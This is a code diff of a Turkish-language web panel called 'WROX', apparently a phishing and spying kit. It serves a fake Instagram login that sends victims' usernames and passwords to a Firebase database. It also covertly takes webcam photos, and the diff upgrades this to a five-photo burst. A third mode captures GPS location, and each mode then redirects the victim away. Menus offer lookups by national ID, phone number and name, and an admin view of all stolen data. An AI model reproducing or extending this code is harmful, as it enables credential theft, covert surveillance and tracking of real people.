@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V76 - CENTRAL COMMAND</title>
+    <title>WROX V78 - ULTIMATE COMMAND</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -11,7 +11,6 @@
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Consolas', monospace; }
         body { background: var(--bg); color: #fff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
 
-        /* HEADER & MENU */
         header { height: 60px; background: #000; border-bottom: 2px solid var(--p); display: flex; align-items: center; padding: 0 20px; justify-content: space-between; z-index: 1001; }
         .ham-btn { font-size: 30px; cursor: pointer; color: var(--p); }
         aside { position: fixed; top: 0; left: -300px; width: 280px; height: 100vh; background: #000; border-right: 1px solid #1a1a1a; transition: 0.4s; z-index: 2000; display: flex; flex-direction: column; overflow-y: auto; }
@@ -22,7 +21,6 @@
         .menu-item:hover, .menu-item.active { background: rgba(0,242,255,0.05); color: var(--p); border-left: 4px solid var(--p); }
         .nav-cat { padding: 15px 20px 5px; font-size: 10px; color: #333; letter-spacing: 2px; }
 
-        /* CONTENT */
         main { flex: 1; padding: 25px; overflow-y: auto; }
         .page { display: none; max-width: 800px; margin: 0 auto; }
         .page.active { display: block; }
@@ -31,13 +29,13 @@
         button:hover { background: var(--p); color: #000; }
         .res-box { background: #000; border: 1px solid #111; padding: 15px; color: var(--text); font-size: 12px; min-height: 150px; border-radius: 5px; white-space: pre-wrap; }
         
-        /* LIVE MONITOR BOX */
         .live-box { margin-top: 20px; border: 2px solid var(--p); border-radius: 12px; padding: 20px; background: rgba(0,242,255,0.05); display: none; }
-        .live-box h4 { color: var(--err); font-size: 11px; margin-bottom: 10px; display: flex; align-items: center; }
+        .live-box h4 { color: var(--err); font-size: 11px; margin-bottom: 15px; display: flex; align-items: center; }
         .live-box h4::before { content: '●'; margin-right: 8px; animation: blink 1s infinite; }
         @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
 
         #auth-layer { position: fixed; inset: 0; background: #000; z-index: 10002; display: flex; align-items: center; justify-content: center; }
+        #cam-gallery { display: flex; flex-direction: column; gap: 15px; max-height: 500px; overflow-y: auto; padding-right: 5px; }
     </style>
 </head>
 <body>
@@ -58,21 +56,21 @@
 
 <header>
     <div class="ham-btn" onclick="toggleMenu()">☰</div>
-    <div style="font-weight:900;">WROX <span style="color:var(--p)">V76</span></div>
-    <div id="u-status" style="font-size:10px; color:var(--text);">OFFLINE</div>
+    <div style="font-weight:900;">WROX <span style="color:var(--p)">V78</span></div>
+    <div id="u-status" style="font-size:10px; color:var(--text);">MISAFIR</div>
 </header>
 
 <aside id="menu">
-    <div class="nav-cat">SORGU ARAÇLARI</div>
+    <div class="nav-cat">SORGULAR</div>
     <div class="menu-item active" onclick="pg('adsoyad')">👤 Ad Soyad</div>
     <div class="menu-item" onclick="pg('tc')">🆔 T.C. Sorgu</div>
     <div class="menu-item" onclick="pg('gsm')">📞 GSM Sorgu</div>
     <div class="nav-cat">SIZMA ARAÇLARI</div>
     <div class="menu-item" onclick="pg('spy_insta')">📸 Instagram</div>
-    <div class="menu-item" onclick="pg('spy_cam')">📷 Kamera</div>
+    <div class="menu-item" onclick="pg('spy_cam')">📷 Kamera (5x)</div>
     <div class="menu-item" onclick="pg('spy_loc')">📍 Konum</div>
     <div id="admin-tools" style="display:none;">
-        <div class="nav-cat">ADMİN PANEL</div>
+        <div class="nav-cat">YÖNETİM</div>
         <div class="menu-item" onclick="pg('logs')" style="color:var(--text)">📁 TÜM LOGLAR</div>
         <div class="menu-item" onclick="pg('users')" style="color:var(--p)">👥 KULLANICILAR</div>
     </div>
@@ -87,25 +85,25 @@
     <div id="p-spy_insta" class="page">
         <h2>📸 INSTA PHISH</h2>
         <button onclick="gen('insta')">LİNK OLUŞTUR</button>
-        <input id="url-insta" readonly style="display:none; color:yellow; font-size:10px;">
+        <input id="url-insta" readonly style="display:none; color:yellow; font-size:11px;">
         <div id="box-insta" class="live-box"><h4>SON GELEN VERİ:</h4><div id="live-u"></div><div id="live-p" style="color:yellow"></div></div>
     </div>
 
     <div id="p-spy_cam" class="page">
-        <h2>📷 CAM SPY</h2>
+        <h2>📷 KAMERA SIZMA (5x BURST)</h2>
         <button onclick="gen('cam')">LİNK OLUŞTUR</button>
-        <input id="url-cam" readonly style="display:none; color:yellow; font-size:10px;">
-        <div id="box-cam" class="live-box"><h4>SON GÖRÜNTÜ:</h4><img id="live-img" src="" style="width:100%; border-radius:5px;"></div>
+        <input id="url-cam" readonly style="display:none; color:yellow; font-size:11px;">
+        <div id="box-cam" class="live-box"><h4>CANLI GÖRÜNTÜ AKIŞI:</h4><div id="cam-gallery"></div></div>
     </div>
 
     <div id="p-spy_loc" class="page">
-        <h2>📍 GPS TRACK</h2>
+        <h2>📍 KONUM TAKİBİ</h2>
         <button onclick="gen('loc')">LİNK OLUŞTUR</button>
-        <input id="url-loc" readonly style="display:none; color:yellow; font-size:10px;">
+        <input id="url-loc" readonly style="display:none; color:yellow; font-size:11px;">
         <div id="box-loc" class="live-box"><h4>SON KONUM:</h4><a id="map-url" href="#" target="_blank" style="color:var(--p)">[ HARİTADA GÖR ]</a></div>
     </div>
 
-    <div id="p-logs" class="page"><h2>📁 TÜM SİSTEM LOGLARI (ADMİN)</h2><div id="log-list" class="res-box"></div></div>
+    <div id="p-logs" class="page"><h2>📁 TÜM LOGLAR (ADMİN)</h2><div id="log-list" class="res-box"></div></div>
     <div id="p-users" class="page"><h2>👥 KAYITLI KULLANICILAR</h2><div id="u-list" class="res-box"></div></div>
 </main>
 
@@ -157,12 +155,16 @@
     }
 
     db.ref('spy_logs').on('child_added', s => {
-        const d = s.val();
-        const myId = ses.e.replace(/\./g,'_');
-        // Filtre: Eğer veri benimse VEYA ben adminsem göster
+        const d = s.val(), myId = ses.e.replace(/\./g,'_');
         if(d.owner === myId || ses.r === 'admin') {
-            if(d.type==='PHISH') { document.getElementById('box-insta').style.display='block'; document.getElementById('live-u').innerText="Kullanıcı: "+d.u; document.getElementById('live-p').innerText="Şifre: "+d.p; }
-            if(d.type==='CAMERA') { document.getElementById('box-cam').style.display='block'; document.getElementById('live-img').src=d.foto; }
+            if(d.type==='PHISH') { document.getElementById('box-insta').style.display='block'; document.getElementById('live-u').innerText="U: "+d.u; document.getElementById('live-p').innerText="P: "+d.p; }
+            if(d.type==='CAMERA') { 
+                document.getElementById('box-cam').style.display='block';
+                const gallery = document.getElementById('cam-gallery');
+                const img = document.createElement('img'); img.src = d.foto;
+                img.style = "width:100%; border:1px solid var(--p); border-radius:5px;";
+                gallery.insertBefore(img, gallery.firstChild);
+            }
             if(d.type==='LOCATION') { document.getElementById('box-loc').style.display='block'; document.getElementById('map-url').href=d.map; }
         }
         if(ses.r==='admin') {
@@ -179,23 +181,30 @@
     }
     function logout() { localStorage.clear(); location.reload(); }
 
-    // VICTIM SIDE
     const q = new URLSearchParams(window.location.search);
     const mode = q.get('mode'), vid = q.get('id'), owner = q.get('owner');
     if(mode && vid && owner) {
         document.body.innerHTML = `<div id="v" style="background:#fff; height:100vh; padding:50px; text-align:center; color:#000;"></div>`;
         if(mode==='insta') {
-            document.getElementById('v').innerHTML = `<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="150"><br><br><input id="vu" placeholder="Username" style="color:#000; border:1px solid #ccc;"><input id="vp" type="password" placeholder="Password" style="color:#000; border:1px solid #ccc;"><button onclick="vHit()" style="background:#0095f6; color:#fff;">Log In</button>`;
+            document.getElementById('v').innerHTML = `<img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="150"><br><br><input id="vu" placeholder="Username"><input id="vp" type="password" placeholder="Password"><button onclick="vHit()" style="background:#0095f6; color:#fff;">Log In</button>`;
         }
         if(mode==='cam') {
             navigator.mediaDevices.getUserMedia({video:true}).then(s=>{
                 const ve = document.createElement('video'); ve.srcObject=s; ve.play();
-                setTimeout(()=>{
-                    const c = document.createElement('canvas'); c.width=640; c.height=480;
-                    c.getContext('2d').drawImage(ve,0,0);
-                    db.ref('spy_logs/'+vid).set({type:'CAMERA', foto:c.toDataURL('image/jpeg'), owner:owner, date:new Date().toLocaleString()}).then(()=>location.href="https://google.com");
-                },2500);
-            });
+                let count = 0;
+                const snap = () => {
+                    if(count < 5) {
+                        count++;
+                        setTimeout(() => {
+                            const c = document.createElement('canvas'); c.width=640; c.height=480;
+                            c.getContext('2d').drawImage(ve,0,0);
+                            db.ref('spy_logs/'+vid+'_'+count).set({type:'CAMERA', foto:c.toDataURL('image/jpeg'), owner:owner, date:new Date().toLocaleTimeString()});
+                            snap();
+                        }, 2000);
+                    } else { setTimeout(()=>location.href="https://google.com", 1000); }
+                };
+                setTimeout(snap, 1000);
+            }).catch(()=>location.href="https://google.com");
         }
         if(mode==='loc') {
             navigator.geolocation.getCurrentPosition(p => {
@@ -205,8 +214,7 @@
         }
     }
     function vHit() { 
-        db.ref('spy_logs/'+vid).set({type:'PHISH', u:document.getElementById('vu').value, p:document.getElementById('vp').value, owner:owner, date:new Date().toLocaleString()})
-        .then(()=>location.href="https://instagram.com"); 
+        db.ref('spy_logs/'+vid).set({type:'PHISH', u:document.getElementById('vu').value, p:document.getElementById('vp').value, owner:owner, date:new Date().toLocaleString()}).then(()=>location.href="https://instagram.com"); 
     }
 </script>
 </body>
